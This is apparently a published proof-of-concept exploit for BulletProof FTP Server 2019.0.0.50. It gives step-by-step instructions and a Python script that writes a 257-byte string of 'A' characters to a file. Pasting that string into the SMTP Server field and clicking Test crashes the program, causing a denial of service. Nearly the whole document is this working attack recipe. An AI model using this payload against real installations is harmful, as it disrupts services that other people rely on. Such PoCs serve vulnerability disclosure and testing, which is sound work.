#Exploit Title: BulletProof FTP Server 2019.0.0.50 - Denial of Service (PoC)
#Discovery by: Victor Mondragón
#Discovery Date: 2018-02-19
#Vendor Homepage: http://bpftpserver.com/
#Software Link: http://bpftpserver.com/products/bpftpserver/windows/download
#Tested Version: 2019.0.0.50
#Tested on: Windows 7 x64 Service Pack 1

#Steps to produce the crash:
#1.- Run python code: BulletProof_FTP_Server_2019.0.0.50.py
#2.- Open bullet.txt and copy content to clipboard
#3.- Open BulletProof FTP Server
#4.- Select "Settings" > "SMTP"
#5.- In "Email Server" select "SMTP Server" and Paste Clipboard
#6.- Click on "Test"
#7.- Crashed

cod = "\x41" * 257

f = open('bullet.txt', 'w')
f.write(cod)
f.close()